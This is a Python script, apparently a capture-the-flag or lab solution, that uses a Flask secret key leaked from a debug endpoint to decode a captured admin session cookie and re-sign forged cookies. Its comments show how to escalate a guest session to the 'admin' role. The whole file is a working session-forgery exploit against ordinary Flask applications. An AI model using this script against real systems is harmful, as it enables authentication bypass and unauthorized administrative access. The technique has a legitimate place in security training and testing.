import json
import hashlib
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature, BadSignature
from flask.sessions import TaggedJSONSerializer

# --- Configuration ---
# The secret key found from the /debug endpoint
SECRET_KEY = "insecure-secret-key-12345"

# The session cookie captured after logging in as admin/admin
ADMIN_SESSION_COOKIE = (
    ".eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0xRsjKEsPMScxHStQBzLw-T.aSvABQ.mMf9ZaH1M_IkhkBqKnU3XnzB_Ck"
)

# --- Helper Functions ---
def get_serializer(secret_key: str):
    """Returns the URLSafeTimedSerializer configured for Flask sessions."""
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    return URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',  # Default salt for Flask sessions
        serializer=serializer,
        signer_kwargs=signer_kwargs
    )

def decode_flask_session_cookie(cookie_string: str, secret_key: str) -> dict:
    """Decodes a Flask session cookie string back into a dictionary."""
    s = get_serializer(secret_key)
    try:
        decoded_data = s.loads(cookie_string)
        return decoded_data
    except (BadTimeSignature, BadSignature) as e:
        print(f"Error decoding cookie: {e}")
        return {}
    except Exception as e:
        print(f"An unexpected error occurred during decoding: {e}")
        return {}

def encode_flask_session_cookie(data: dict, secret_key: str) -> str:
    """Encodes a dictionary into a Flask session cookie string."""
    s = get_serializer(secret_key)
    return s.dumps(data)

# --- Main Logic ---
if __name__ == "__main__":
    print(f"--- Decoding Admin Session Cookie ---")
    decoded_admin_data = decode_flask_session_cookie(ADMIN_SESSION_COOKIE, SECRET_KEY)
    if decoded_admin_data:
        print(f"Decoded Admin Session Data: {json.dumps(decoded_admin_data, indent=2)}")

        # --- Forging a Session (Example: if we wanted to change a user's role) ---
        # In this case, we already have an admin cookie, so we'll just re-encode it
        # to demonstrate the process. If we had a guest cookie, we would modify
        # 'role' to 'admin' here.

        # Example modification (if decoded_admin_data was from a guest user):
        # if 'role' in decoded_admin_data and decoded_admin_data['role'] != 'admin':
        #     decoded_admin_data['role'] = 'admin'
        #     print("\n--- Modified session data to 'admin' role ---")

        print("\n--- Re-encoding (Forging) the Session Cookie ---")
        forged_session_cookie = encode_flask_session_cookie(decoded_admin_data, SECRET_KEY)
        print(f"Forged Session Cookie: {forged_session_cookie}")

        # --- Verification (Optional: Decode the forged cookie to ensure it's correct) ---
        print("\n--- Verifying Forged Cookie ---")
        verified_data = decode_flask_session_cookie(forged_session_cookie, SECRET_KEY)
        print(f"Verified Decoded Data: {json.dumps(verified_data, indent=2)}")

    else:
        print("Failed to decode the admin session cookie.")
